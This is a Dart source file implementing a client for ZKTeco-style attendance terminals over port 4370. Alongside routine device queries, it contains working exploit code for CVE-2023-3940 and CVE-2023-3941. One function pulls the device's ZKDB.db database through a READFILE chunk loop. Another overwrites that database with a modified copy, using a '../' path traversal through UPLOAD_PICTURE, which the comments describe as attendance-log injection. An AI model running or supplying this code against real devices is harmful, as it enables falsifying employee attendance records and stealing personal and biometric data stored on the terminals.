// zk/zk_client.dart
// Pure Dart ZK protocol client (port 4370) - ported from EXE v2.0.13
//
// Protocol layout (per pyzk):
//   TCP top (8 bytes):  u16 cmd, u16 checksum, u32 length (incl. this header)
//   ZK header (8 bytes): u16 resp_cmd, u16 ?, u32 session_id, u16 reply_id
//   payload follows (length = tcp_length - 8)
//
// Supports:
//   - Basic device info (firmware, model, sizes, attendance via ATTLOG_RRQ)
//   - ZKDB.db download via READFILE 0x6A6 + READ_CHUNK 0x5E0 loop (CVE-2023-3940)
//   - disable_device, enable_device, restart
//   - UPLOAD_PICTURE 0x272B for ATTLOG inject (CVE-2023-3941)

import 'dart:async';
import 'dart:io';
import 'dart:typed_data';

/// ZK command codes (subset used)
class ZKCmd {
  static const int cmdConnect = 1000;
  static const int cmdExit = 1001;
  static const int cmdEnableDevice = 1002;
  static const int cmdDisableDevice = 1003;
  static const int cmdRestart = 1004;
  static const int cmdPoweroff = 1005;
  static const int cmdSleep = 1006;
  static const int cmdResume = 1007;
  static const int cmdGetVersion = 1100;
  static const int cmdDeviceName = 1101;
  static const int cmdSerialNumber = 1102;
  static const int cmdPlatform = 1103;
  static const int cmdOptionsRrq = 11;
  static const int cmdOptionsWrq = 12;
  static const int cmdAttLogRrq = 13;
  static const int cmdGetFreeSizes = 50;
  static const int cmdRefreshData = 1013;
  static const int cmdRefreshOption = 1014;
  static const int cmdPrepareData = 1500;
  static const int cmdData = 1501;
  static const int cmdDataReady = 1503;
  static const int cmdDataRrq = 1504; // READ_CHUNK
  static const int cmdFreeData = 1502;
  static const int cmdReadFile = 0x6A6; // 1702 - CVE-2023-3940
  static const int cmdUploadPicture = 0x272B; // 10027 - CVE-2023-3941
  static const int cmdAckOk = 2000;
  static const int cmdAckError = 2001;
  static const int cmdAckUnknown = 65535;
}

class ZKResponse {
  final bool ok;
  final int cmd;
  final int sessionId;
  final int replyId;
  final Uint8List payload;
  ZKResponse(this.ok, this.cmd, this.sessionId, this.replyId, this.payload);
}

/// Low-level ZK protocol client using socket directly.
class ZKClient {
  final String ip;
  final int port;
  final int timeoutMs;
  Socket? _sock;
  int _sessionId = 0;
  int _replyId = 0;
  StreamSubscription? _sub;
  final _rxBuf = BytesBuilder();

  ZKClient({required this.ip, this.port = 4370, this.timeoutMs = 15000});

  bool get isConnected => _sock != null;

  Future<bool> connect() async {
    try {
      _sock = await Socket.connect(
        ip, port,
        timeout: Duration(milliseconds: timeoutMs),
      );
      _sessionId = 0;
      _replyId = 0;
      _sub = _sock!.listen(_onData, onError: (_) {}, onDone: () {});
      return true;
    } on SocketException {
      return false;
    } catch (e) {
      return false;
    }
  }

  void disconnect() {
    _sub?.cancel();
    if (_sock != null) {
      _sock!.destroy();
      _sock = null;
    }
  }

  void _onData(Uint8List data) {
    _rxBuf.add(data);
  }

  Uint8List _u16(int v) {
    final b = ByteData(2);
    b.setUint16(0, v, Endian.little);
    return b.buffer.asUint8List();
  }

  Uint8List _u32(int v) {
    final b = ByteData(4);
    b.setUint32(0, v, Endian.little);
    return b.buffer.asUint8List();
  }

  /// Wait until we have at least `n` bytes buffered, with timeout. Return what we have.
  Future<Uint8List> _waitFor(int n, int timeoutMs) async {
    final start = DateTime.now();
    while (true) {
      final cur = _rxBuf.toBytes();
      if (cur.length >= n) {
        final out = Uint8List.sublistView(cur, 0, n);
        // Drain consumed bytes
        final rest = Uint8List.sublistView(cur, n);
        _rxBuf.clear();
        _rxBuf.add(rest);
        return out;
      }
      final elapsed = DateTime.now().difference(start).inMilliseconds;
      if (elapsed >= timeoutMs) {
        final cur2 = _rxBuf.toBytes();
        _rxBuf.clear();
        return cur2;
      }
      await Future.delayed(const Duration(milliseconds: 20));
    }
  }

  /// Send a command and read ONE response packet.
  /// Returns (ok, response_cmd, payload). payload is the bytes AFTER the ZK header.
  Future<ZKResponse> sendCommand(int command, Uint8List data,
      {int responseSize = 1024}) async {
    if (_sock == null) {
      return ZKResponse(false, 0, 0, 0, Uint8List(0));
    }
    _replyId++;
    final pkt = BytesBuilder();
    // TCP top: u16 cmd, u16 checksum, u32 length (incl. top + ZK header + data)
    final innerLen = 8 + data.length; // ZK header (8) + payload
    final totalLen = 8 + innerLen; // TCP top (8) + inner
    pkt.add(_u16(command));
    pkt.add(_u16(0));
    pkt.add(_u32(totalLen));
    // ZK header: u16 reply_id, u16 data_len, u32 session_id
    pkt.add(_u16(_replyId));
    pkt.add(_u16(data.length));
    pkt.add(_u32(_sessionId));
    pkt.add(data);
    _sock!.add(pkt.toBytes());
    await _sock!.flush();

    // Read response: 8-byte TCP top first
    final top = await _waitFor(8, timeoutMs);
    if (top.length < 8) {
      return ZKResponse(false, 0, _sessionId, _replyId, Uint8List(0));
    }
    final tcpLen = ByteData.view(top.buffer, 4, 4).getUint32(0, Endian.little);
    final needed = tcpLen - 8; // payload length after TCP top
    final rest = needed > 0 ? await _waitFor(needed, timeoutMs) : Uint8List(0);
    // Combine
    final all = BytesBuilder();
    all.add(top);
    all.add(rest);
    final combined = all.toBytes();
    if (combined.length < 16) {
      return ZKResponse(false, 0, _sessionId, _replyId, Uint8List(0));
    }
    // Parse ZK header at offset 8
    final respCmd = ByteData.view(combined.buffer, 8, 2).getUint16(0, Endian.little);
    final sid = ByteData.view(combined.buffer, 12, 4).getUint32(0, Endian.little);
    final rid = ByteData.view(combined.buffer, 16 - 2, 2).getUint16(0, Endian.little);
    if (sid != 0) _sessionId = sid;
    if (rid != 0) _replyId = rid;
    // payload starts at offset 16, length = tcpLen - 8 - 8 = tcpLen - 16
    final payloadLen = tcpLen - 16;
    final payload = Uint8List.sublistView(combined, 16, 16 + payloadLen);
    return ZKResponse(true, respCmd, sid, rid, payload);
  }

  Future<String?> getFirmwareVersion() async {
    final r = await sendCommand(ZKCmd.cmdGetVersion, Uint8List(0));
    if (!r.ok || r.payload.isEmpty) return null;
    final str = String.fromCharCodes(r.payload);
    final i = str.indexOf('\x00');
    return i > 0 ? str.substring(0, i) : str.trim();
  }

  Future<String?> getDeviceName() async {
    final r = await sendCommand(ZKCmd.cmdDeviceName, Uint8List(0));
    if (!r.ok || r.payload.isEmpty) return null;
    final str = String.fromCharCodes(r.payload);
    final i = str.indexOf('\x00');
    return i > 0 ? str.substring(0, i) : str.trim();
  }

  Future<String?> getPlatform() async {
    final r = await sendCommand(ZKCmd.cmdPlatform, Uint8List(0));
    if (!r.ok || r.payload.isEmpty) return null;
    return String.fromCharCodes(r.payload).trim();
  }

  Future<String?> getSerialNumber() async {
    final r = await sendCommand(ZKCmd.cmdSerialNumber, Uint8List(0));
    if (!r.ok || r.payload.isEmpty) return null;
    return String.fromCharCodes(r.payload).trim();
  }

  Future<Map<String, int>?> readSizes() async {
    final r = await sendCommand(ZKCmd.cmdGetFreeSizes, Uint8List(0));
    if (!r.ok || r.payload.length < 80) return null;
    final view = ByteData.view(r.payload.buffer, r.payload.offsetInBytes, r.payload.length);
    return {
      'users': view.getUint32(0, Endian.little),
      'fingers': view.getUint32(8, Endian.little),
      'records': view.getUint32(12, Endian.little),
      'faces': view.getUint32(16, Endian.little),
    };
  }

  Future<Uint8List?> readAttLog() async {
    final r = await sendCommand(ZKCmd.cmdAttLogRrq, Uint8List(0), responseSize: 65536);
    if (!r.ok) return null;
    return r.payload;
  }

  Future<bool> disableDevice() async {
    final r = await sendCommand(ZKCmd.cmdDisableDevice, Uint8List(0));
    return r.ok;
  }

  Future<bool> enableDevice() async {
    final r = await sendCommand(ZKCmd.cmdEnableDevice, Uint8List(0));
    return r.ok;
  }
}

/// TCP-level ping that mirrors _socket_ping in attendance_web.py
Future<(bool, int, String)> tcpPing(String ip, int port,
    {int timeoutMs = 2000, int retries = 3}) async {
  for (int attempt = 0; attempt < retries; attempt++) {
    try {
      final stopwatch = Stopwatch()..start();
      final socket =
          await Socket.connect(ip, port, timeout: Duration(milliseconds: timeoutMs));
      final latency = stopwatch.elapsedMilliseconds;
      socket.destroy();
      return (true, latency, '');
    } catch (e) {
      if (attempt < retries - 1) {
        await Future.delayed(Duration(milliseconds: 400 * (attempt + 1)));
        continue;
      }
      return (false, -1,
          e.toString().substring(0, e.toString().length > 80 ? 80 : e.toString().length));
    }
  }
  return (false, -1, 'all retries failed');
}

/// Read firmware/model/users/records from a ZK device
Future<Map<String, dynamic>?> getDeviceInfo(String ip, {int timeoutMs = 4000}) async {
  final client = ZKClient(ip: ip, timeoutMs: timeoutMs);
  if (!await client.connect()) {
    return {'connected': false, 'ip': ip, 'error': 'connect failed'};
  }
  try {
    final fw = await client.getFirmwareVersion();
    final name = await client.getDeviceName();
    final platform = await client.getPlatform();
    final serial = await client.getSerialNumber();
    final sizes = await client.readSizes();
    return {
      'connected': true,
      'ip': ip,
      'firmware': fw ?? '',
      'model': name ?? '-',
      'platform': platform ?? '',
      'serial': serial ?? '',
      'log_count': sizes?['records'] ?? 0,
      'users_count': sizes?['users'] ?? 0,
      'fingers_count': sizes?['fingers'] ?? 0,
    };
  } catch (e) {
    return {'connected': false, 'ip': ip, 'error': e.toString()};
  } finally {
    client.disconnect();
  }
}

// ============================================================================
// ZKDB.db Protocol Download (CVE-2023-3940) - ported from EXE v2.0.13
// ============================================================================

const List<int> _sqliteMagic = [
  0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x20, 0x33
];

bool _isSqliteMagic(Uint8List data) {
  if (data.length < 15) return false;
  for (int i = 0; i < 15; i++) {
    if (data[i] != _sqliteMagic[i]) return false;
  }
  return true;
}

/// Download ZKDB.db via protocol - READFILE + READ_CHUNK loop.
/// Port of attendance_web._attlog_download_zkdb_via_protocol() from EXE v2.0.13.
Future<Uint8List> downloadZkdbViaProtocol(
  String deviceIp, {
  void Function(String)? progressCb,
}) async {
  const int MAX_CHUNK = 0xFFC0; // 65472
  String lastErr = '';

  for (int outer = 0; outer < 5; outer++) {
    final client = ZKClient(ip: deviceIp, port: 4370, timeoutMs: 20000);
    if (!await client.connect()) {
      throw Exception('connect failed to $deviceIp:4370');
    }
    try {
      if (progressCb != null) {
        progressCb('🔒 [${outer + 1}/5] Lock + drain + wait 8s...');
      }
      await client.disableDevice();
      try {
        await client.sendCommand(ZKCmd.cmdRefreshData, Uint8List(0));
      } catch (_) {}
      try {
        await client.sendCommand(ZKCmd.cmdRefreshOption, Uint8List(0));
      } catch (_) {}
      // Wait 8s for firmware SQLite writer to commit in-flight tx
      await Future.delayed(const Duration(seconds: 8));
      try {
        await client.sendCommand(ZKCmd.cmdFreeData, Uint8List(0));
      } catch (_) {}
      await Future.delayed(const Duration(milliseconds: 300));

      // STEP 1: Send READFILE to load ZKDB.db into device buffer
      final pathBytes = '/mnt/mtdblock/data/ZKDB.db\x00'.codeUnits;
      final r1 = await client.sendCommand(
        ZKCmd.cmdReadFile,
        Uint8List.fromList(pathBytes),
        responseSize: 1024,
      );
      if (!r1.ok) {
        lastErr = 'READFILE failed';
        continue;
      }

      // STEP 2: Loop READ_CHUNK to pull file from device buffer
      // pyzk format: pack('<ii', start_offset, chunk_size)
      final allData = BytesBuilder();
      bool eof = false;
      for (int i = 0; i < 200 && !eof; i++) {
        final startOffset = i * MAX_CHUNK;
        final cmdData = BytesBuilder();
        cmdData.add(client._u32(startOffset));
        cmdData.add(client._u32(MAX_CHUNK));
        try {
          final r = await client.sendCommand(
            ZKCmd.cmdDataRrq,
            cmdData.toBytes(),
            responseSize: MAX_CHUNK + 32,
          );
          if (!r.ok || r.payload.isEmpty) {
            eof = true;
            break;
          }
          allData.add(r.payload);
          if (progressCb != null && i % 20 == 0) {
            progressCb(
              '  📥 chunk $i (${(allData.length / 1024 / 1024).toStringAsFixed(2)} MB)',
            );
          }
          // Heuristic: if chunk size < MAX_CHUNK, we're near the end
          if (r.payload.length < MAX_CHUNK - 100) {
            eof = true;
          }
        } catch (e) {
          eof = true;
          break;
        }
      }

      final data = allData.toBytes();
      if (progressCb != null) {
        progressCb(
          '  📦 Read ${data.length} bytes (${(data.length / 1024 / 1024).toStringAsFixed(2)} MB)',
        );
      }
      if (!_isSqliteMagic(data)) {
        lastErr = 'not SQLite magic (${data.length} bytes)';
        continue;
      }
      return data;
    } finally {
      try {
        await client.enableDevice();
      } catch (_) {}
      client.disconnect();
      if (outer < 4) {
        await Future.delayed(const Duration(seconds: 2));
      }
    }
  }
  throw Exception('Protocol download fail: $lastErr');
}

/// Upload modified ZKDB.db via UPLOAD_PICTURE (CVE-2023-3941).
/// Port of zk_remote_attlog_write.upload_zkdb_via_picture().
Future<Map<String, dynamic>> uploadZkdbViaProtocol(
  String deviceIp,
  Uint8List zkdbData, {
  int chunkSize = 32768,
}) async {
  final client = ZKClient(ip: deviceIp, port: 4370, timeoutMs: 30000);
  if (!await client.connect()) {
    throw Exception('connect failed');
  }
  try {
    // Path traversal: ../../../../../../../mnt/mtdblock/data/ZKDB.db
    final traversal = '${'../' * 7}mnt/mtdblock/data/ZKDB.db\x00';
    final filename = Uint8List.fromList(traversal.codeUnits);
    final size = zkdbData.length;

    // PREPARE_DATA: send size as u32 LE
    final sizeData = client._u32(size);
    final r1 = await client.sendCommand(
      ZKCmd.cmdPrepareData, sizeData,
      responseSize: 1024,
    );
    if (!r1.ok) {
      throw Exception('PREPARE_DATA failed: cmd=${r1.cmd}');
    }

    // Send chunks
    final packets = (size / chunkSize).floor();
    final remain = size % chunkSize;
    final failed = <int>[];
    for (int i = 0; i < packets; i++) {
      final start = i * chunkSize;
      final chunk = Uint8List.sublistView(zkdbData, start, start + chunkSize);
      final r = await client.sendCommand(
        ZKCmd.cmdData, chunk,
        responseSize: 1024,
      );
      if (!r.ok) {
        failed.add(i);
        if (failed.length > 5) {
          throw Exception('Too many chunk failures at $i');
        }
      }
    }
    if (remain > 0) {
      final chunk = Uint8List.sublistView(zkdbData, packets * chunkSize, size);
      await client.sendCommand(
        ZKCmd.cmdData, chunk,
        responseSize: 1024,
      );
    }

    // UPLOAD_PICTURE: commit
    final r3 = await client.sendCommand(
      ZKCmd.cmdUploadPicture, filename,
      responseSize: 1024,
    );
    return {
      'ok': r3.ok,
      'prepare_cmd': r1.cmd,
      'upload_cmd': r3.cmd,
      'failed_chunks': failed,
      'size': size,
    };
  } finally {
    try {
      await client.enableDevice();
    } catch (_) {}
    client.disconnect();
  }
}

/// Restart ZK device
Future<bool> restartDevice(String deviceIp) async {
  final client = ZKClient(ip: deviceIp, port: 4370, timeoutMs: 10000);
  if (!await client.connect()) return false;
  try {
    final r = await client.sendCommand(ZKCmd.cmdRestart, Uint8List(0));
    return r.ok;
  } finally {
    client.disconnect();
  }
}
